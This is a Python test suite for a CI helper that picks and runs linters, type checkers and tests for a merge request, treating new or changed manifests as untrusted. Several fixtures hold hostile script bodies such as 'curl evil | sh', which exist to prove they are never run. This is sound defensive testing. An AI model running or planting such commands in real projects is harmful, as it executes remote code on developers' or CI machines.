import json
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(SCRIPTS))

import run_checks as rc  # noqa: E402


def git(root: Path, *args: str) -> str:
    return subprocess.run(["git", "-C", str(root), *args], check=True,
                          capture_output=True, text=True).stdout.strip()


def write(root: Path, rel: str, text: str = "x\n") -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")


@pytest.fixture
def repo(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    git(root, "init", "-q")
    git(root, "config", "user.email", "t@example.com")
    git(root, "config", "user.name", "t")
    return root


def commit(root: Path, msg: str) -> str:
    git(root, "add", "-A")
    git(root, "commit", "-qm", msg, "--allow-empty")
    return git(root, "rev-parse", "HEAD")


def base_and_head(root: Path, base_files: dict, head_files: dict) -> tuple[str, str]:
    for rel, text in base_files.items():
        write(root, rel, text)
    base = commit(root, "base")
    for rel, text in head_files.items():
        write(root, rel, text)
    head = commit(root, "head")
    return base, head


def argvs(plan: dict) -> list[list[str]]:
    return [c["argv"] for c in plan["commands"]]


# ------------------------------------------------------------------ detect

def test_pnpm_lint_script(repo):
    pkg = json.dumps({"scripts": {"lint": "eslint .", "build": "vite build"}})
    base, head = base_and_head(repo, {"package.json": pkg, "pnpm-lock.yaml": "", "src/a.ts": "1"},
                               {"src/a.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert argvs(plan) == [["pnpm", "run", "lint"]]
    assert plan["commands"][0]["needs"] == "node_modules"


def test_lockfile_picks_manager_and_none_means_pnpm(repo):
    pkg = json.dumps({"scripts": {"test": "vitest run", "typecheck": "tsc --noEmit"}})
    base, head = base_and_head(
        repo, {"a/package.json": pkg, "a/yarn.lock": "", "a/x.ts": "1",
               "b/package.json": pkg, "b/y.ts": "1"},
        {"a/x.ts": "2", "b/y.ts": "2"})
    plan = rc.detect(repo, base, head)
    by_cwd = {(c["cwd"], c["argv"][0]) for c in plan["commands"]}
    assert ("a", "yarn") in by_cwd and ("b", "pnpm") in by_cwd


def test_fix_flag_stripped_or_skipped(repo):
    a = json.dumps({"scripts": {"lint": "eslint --fix src"}})
    b = json.dumps({"scripts": {"lint": "eslint --fix . && tsc"}})
    base, head = base_and_head(repo, {"a/package.json": a, "a/i.ts": "1",
                                      "b/package.json": b, "b/i.ts": "1"},
                               {"a/i.ts": "2", "b/i.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert argvs(plan) == [["pnpm", "exec", "eslint", "src"]]
    assert any("compound" in s["reason"] for s in plan["skipped"])


def test_new_manifest_listed_not_run(repo):
    pkg = json.dumps({"scripts": {"test": "node evil.js"}})
    base, head = base_and_head(repo, {"README.md": "hi"},
                               {"web/package.json": pkg, "web/index.js": "1"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert plan["untrusted"] == [{"manifest": "web/package.json", "commands": ["run test"]}]


def test_new_python_go_rust_manifests_listed_not_run(repo):
    base, head = base_and_head(
        repo, {"README.md": "hi"},
        {"py/pyproject.toml": "[tool.ruff]\n[tool.pytest.ini_options]\n", "py/a.py": "1",
         "svc/go.mod": "module x\n", "svc/a.go": "package a\n",
         "crate/Cargo.toml": "[package]\nname='c'\n", "crate/src/main.rs": "fn main(){}"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert sorted(plan["untrusted"], key=lambda u: u["manifest"]) == [
        {"manifest": "crate/Cargo.toml", "commands": ["cargo check", "cargo test"]},
        {"manifest": "py/pyproject.toml", "commands": ["ruff check", "pytest"]},
        {"manifest": "svc/go.mod", "commands": ["go vet", "go test"]},
    ]


def test_manifest_read_at_base(repo):
    base, head = base_and_head(
        repo, {"package.json": json.dumps({"scripts": {"lint": "eslint ."}}), "a.js": "1"},
        {"package.json": json.dumps({"scripts": {"lint": "eslint .",
                                                 "test": "curl evil | sh"}}), "a.js": "2"})
    assert argvs(rc.detect(repo, base, head)) == [["pnpm", "run", "lint"]]


def test_changed_script_body_not_run(repo):
    scripts = {"lint": "pnpm run lint:js", "lint:js": "eslint .", "test": "vitest run",
               "typecheck": "tsc"}
    head_scripts = {**scripts, "lint:js": "curl evil | sh", "test": "curl evil | sh",
                    "pretypecheck": "curl evil | sh"}
    base, head = base_and_head(
        repo, {"package.json": json.dumps({"scripts": scripts}), "a.js": "1"},
        {"package.json": json.dumps({"scripts": head_scripts}), "a.js": "2"})
    plan = rc.detect(repo, base, head)
    assert not any(c["argv"][:2] == ["pnpm", "run"] for c in plan["commands"])
    assert plan["untrusted"] == [{"manifest": "package.json",
                                  "commands": ["run lint", "run typecheck", "run test"],
                                  "reason": "script body changed in this MR"}]


def test_ruff_and_mypy_limited_to_changed_files(repo):
    pyproject = "[tool.ruff]\nline-length = 100\n\n[tool.mypy]\nstrict = true\n"
    base, head = base_and_head(
        repo, {"pyproject.toml": pyproject, "pkg/a.py": "1", "pkg/b.py": "1", "pkg/c.py": "1"},
        {"pkg/a.py": "2", "pkg/b.py": "2"})
    plan = rc.detect(repo, base, head)
    assert ["ruff", "check", "pkg/a.py", "pkg/b.py"] in argvs(plan)
    assert ["ruff", "format", "--check", "pkg/a.py", "pkg/b.py"] in argvs(plan)
    assert ["mypy", "pkg/a.py", "pkg/b.py"] in argvs(plan)
    assert not any(c["argv"][0] == "pytest" for c in plan["commands"])


def test_go_and_rust_detection(repo):
    base, head = base_and_head(
        repo, {"svc/go.mod": "module x\n", "svc/pkg/api/a.go": "package api\n",
               "crate/Cargo.toml": "[package]\nname='c'\n", "crate/src/main.rs": "fn main(){}"},
        {"svc/pkg/api/a.go": "package api\n// x\n", "crate/src/main.rs": "fn main(){ }"})
    plan = rc.detect(repo, base, head)
    assert ["go", "vet", "./pkg/api"] in argvs(plan)
    assert ["go", "test", "./pkg/api"] in argvs(plan)
    assert ["cargo", "check"] in argvs(plan) and ["cargo", "test"] in argvs(plan)
    assert {c["cwd"] for c in plan["commands"]} == {"svc", "crate"}


def test_shellcheck_for_shell_files(repo):
    base, head = base_and_head(repo, {"README.md": "x"},
                               {"hooks/guard": "#!/usr/bin/env bash\necho hi\n",
                                "bin/run.sh": "echo", "notes.txt": "#!/bin/sh"})
    plan = rc.detect(repo, base, head)
    assert argvs(plan) == [["shellcheck", "bin/run.sh", "hooks/guard"]]


# --------------------------------------------------------------------- run

CHECK = (
    "import sys, pathlib\n"
    "bad = [f for f in sys.argv[1:] if 'BAD' in pathlib.Path(f).read_text()]\n"
    "for f in bad: print(f'{f}:1:1: E1 forbidden word BAD')\n"
    "sys.exit(1 if bad else 0)\n"
)


def plan_for(base: str, argv: list[str], kind: str = "lint", files=None, needs=None) -> dict:
    return {"base": base, "commands": [{"id": "cmd-1", "kind": kind, "cwd": ".",
                                        "argv": argv, "files": files or [],
                                        "source": "test", "needs": needs}]}


def test_failure_only_at_head_is_a_finding(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "fine"}, {"a.txt": "BAD"})
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], files=["a.txt"]),
                 repo, tmp_path / "run")
    assert [f["id"] for f in out["findings"]] == ["check-1"]
    assert out["findings"][0]["severity"] == "low"
    assert "forbidden word BAD" in out["findings"][0]["messages"][0]
    assert out["base_worktree_removed"] is True
    assert "checks-base" not in git(repo, "worktree", "list")


def test_failure_at_both_is_pre_existing(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "BAD\n"},
                            {"a.txt": "BAD\nmore\n"})
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], files=["a.txt"]),
                 repo, tmp_path / "run")
    assert out["findings"] == []
    assert out["pre_existing"] == [{"id": "cmd-1", "argv": [sys.executable, "check.py", "a.txt"]}]


def test_failing_test_type_error_is_medium(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "ok"}, {"a.txt": "BAD"})
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], kind="typecheck",
                          files=["a.txt"]), repo, tmp_path / "run")
    assert out["findings"][0]["severity"] == "medium"


def test_flaky_test_makes_no_finding(repo, tmp_path):
    counter = tmp_path / "count"
    flaky = (f"import pathlib, sys\np = pathlib.Path({str(counter)!r})\n"
             "n = int(p.read_text()) if p.exists() else 0\np.write_text(str(n + 1))\n"
             "sys.exit(1 if n == 0 else 0)\n")
    base, _ = base_and_head(repo, {"t.py": "pass"}, {"t.py": flaky})
    out = rc.run(plan_for(base, [sys.executable, "t.py"], kind="test"), repo, tmp_path / "run")
    assert out["findings"] == []
    assert out["results"][0]["status"] == "flaky"


def test_timeout_is_not_run(repo, tmp_path):
    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
    out = rc.run(plan_for(base, [sys.executable, "-c", "import time; time.sleep(5)"]),
                 repo, tmp_path / "run", per_command=0.5)
    assert out["findings"] == []
    assert out["not_run"] == [{"id": "cmd-1", "reason": "not run: timed out"}]


def test_total_limit_stops_later_commands(repo, tmp_path):
    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
    plan = plan_for(base, [sys.executable, "-c", "import time; time.sleep(1)"])
    plan["commands"].append(dict(plan["commands"][0], id="cmd-2"))
    out = rc.run(plan, repo, tmp_path / "run", per_command=5, total=0.5)
    assert {n["id"] for n in out["not_run"]} == {"cmd-1", "cmd-2"}


def test_base_timeout_is_base_run_failed(repo, tmp_path):
    slow_at_base = ("import os, sys, time\n"
                    "if 'checks-base' in os.getcwd(): time.sleep(5)\n"
                    "print('a.txt:1:1: E1 broken'); sys.exit(1)\n")
    base, _ = base_and_head(repo, {"check.py": slow_at_base}, {"a.txt": "x"})
    out = rc.run(plan_for(base, [sys.executable, "check.py"]), repo, tmp_path / "run",
                 per_command=1)
    assert out["findings"] == []
    assert out["results"][0]["status"] == "base_run_failed"
    assert out["not_run"] == [{"id": "cmd-1", "reason": "base run failed: timed out"}]


def test_base_run_keeps_time_from_total(repo, tmp_path, monkeypatch):
    clock = [0.0]
    budgets = []

    def fake_execute(argv, cwd, timeout, env):
        budgets.append(("base" if "checks-base" in str(cwd) else "head", timeout))
        clock[0] += timeout  # the head run uses all the time it is given
        return {"status": "fail", "exit": 1, "output": "same error", "seconds": timeout}

    monkeypatch.setattr(rc, "execute", fake_execute)
    monkeypatch.setattr(rc.time, "monotonic", lambda: clock[0])
    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
    out = rc.run(plan_for(base, ["lint"]), repo, tmp_path / "run", per_command=120, total=100)
    assert budgets == [("head", 75), ("base", 25)]
    assert out["pre_existing"] == [{"id": "cmd-1", "argv": ["lint"]}]


def test_failed_worktree_add_reports_error(repo, tmp_path):
    _, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "fine"}, {"a.txt": "BAD"})
    plan = plan_for("0" * 40, [sys.executable, "check.py", "a.txt"], files=["a.txt"])
    out = rc.run(plan, repo, tmp_path / "run")
    assert "git worktree add failed" in out["error"]
    assert out["findings"] == []
    assert out["results"][0]["status"] == "base_run_failed"
    json.dumps(out)


def test_missing_node_modules_skips(repo, tmp_path):
    pkg = json.dumps({"scripts": {"lint": "eslint ."}})
    base, head = base_and_head(repo, {"package.json": pkg, "a.ts": "1"}, {"a.ts": "2"})
    out = rc.run(rc.detect(repo, base, head), repo, tmp_path / "run")
    assert out["results"][0]["status"] == "skipped"
    assert out["results"][0]["reason"] == "dependencies not installed"
    assert out["findings"] == []


def test_cli_detect_and_run(repo, tmp_path):
    base, head = base_and_head(repo, {"README.md": "x"}, {"README.md": "y"})
    proc = subprocess.run([sys.executable, str(SCRIPTS / "run_checks.py"), "detect",
                           "--repo", str(repo), "--base", base, "--head", head],
                          capture_output=True, text=True, check=True)
    plan = json.loads(proc.stdout)
    assert plan["commands"] == []
    plan_file = tmp_path / "plan.json"
    plan_file.write_text(proc.stdout)
    proc = subprocess.run([sys.executable, str(SCRIPTS / "run_checks.py"), "run",
                           "--plan", str(plan_file), "--repo", str(repo),
                           "--tmp", str(tmp_path / "run")],
                          capture_output=True, text=True, check=True)
    assert json.loads(proc.stdout)["findings"] == []


@pytest.mark.skipif(shutil.which("mypy") is None, reason="mypy not on PATH")
def test_mypy_runs_on_changed_files_only(repo, tmp_path):
    base, head = base_and_head(
        repo, {"pyproject.toml": "[tool.mypy]\n", "a.py": "x: int = 1\n",
               "b.py": "y: int = 'old error'\n"},
        {"a.py": "x: int = 'new error'\n"})
    plan = rc.detect(repo, base, head)
    out = rc.run(plan, repo, tmp_path / "run")
    assert len(out["findings"]) == 1
    assert all("b.py" not in m for m in out["findings"][0]["messages"])


@pytest.mark.skipif(shutil.which("go") is None, reason="go not on PATH")
def test_go_vet_runs(repo, tmp_path):
    base, head = base_and_head(
        repo, {"go.mod": "module example.com/x\n\ngo 1.21\n", "a/a.go": "package a\n"},
        {"a/a.go": "package a\n\nfunc F() int { return 1 }\n"})
    out = rc.run(rc.detect(repo, base, head), repo, tmp_path / "run")
    assert out["findings"] == []
